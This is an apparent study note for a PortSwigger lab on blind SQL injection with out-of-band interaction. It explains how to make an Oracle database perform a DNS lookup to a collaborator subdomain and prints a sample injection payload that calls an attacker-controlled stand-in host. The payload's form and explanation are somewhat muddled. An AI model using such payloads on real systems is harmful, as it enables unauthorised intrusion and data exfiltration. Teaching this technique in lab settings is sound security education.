---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Understanding the Attack Scenario

In the given scenario, the attacker aims to cause the database to perform a DNS lookup to an external domain. This is achieved by injecting SQL commands that trigger the database to make a DNS request to a specific subdomain controlled by the attacker. The confirmation of the DNS lookup is done by checking the BIRP Collaborator server.

### Steps Involved

1. **Generate Unique Subdomain**: Use BIRP Collaborator to generate a unique subdomain.
2. **Inject SQL Payload**: Craft an SQL payload that causes the database to perform a DNS lookup to the generated subdomain.
3. **Confirm DNS Lookup**: Check the BIRP Collaborator server to confirm that the DNS lookup was performed.

### Example Scenario

Let's assume we have a web application with a vulnerable search feature. The SQL query executed by the application might look like this:

```sql
SELECT * FROM products WHERE name = 'search_term';
```

An attacker could inject a payload that causes the database to perform a DNS lookup. For instance, if the database is Oracle, the payload might look like this:

```sql
SELECT * FROM products WHERE name = 'search_term' OR (SELECT NULL FROM DUAL WHERE (SELECT COUNT(*) FROM ALL_USERS WHERE USERNAME='SYS') > 0 AND UTL_INADDR.GET_HOST_ADDRESS('attacker-subdomain.birpcollaborator.com') IS NOT NULL);
```

### Explanation of the Payload

- `SELECT * FROM products WHERE name = 'search_term'`: This is the original query.
- `OR (SELECT NULL FROM DUAL WHERE ... )`: This part introduces a conditional statement that will be true if the DNS lookup is successful.
- `UTL_INADDR.GET_HOST_ADDRESS('attacker-subdomain.birpcollaborator.com')`: This function performs a DNS lookup to the specified subdomain.

### Confirming the DNS Lookup

After injecting the payload, the attacker checks the BIRP Collaborator server to confirm that the DNS lookup was performed. If the lookup is confirmed, the attacker knows that the SQL injection was successful.

---
<!-- nav -->
[[05-Understanding SQL Injection|Understanding SQL Injection]] | [[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/00-Overview|Overview]] | [[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/07-Practice Questions & Answers|Practice Questions & Answers]]
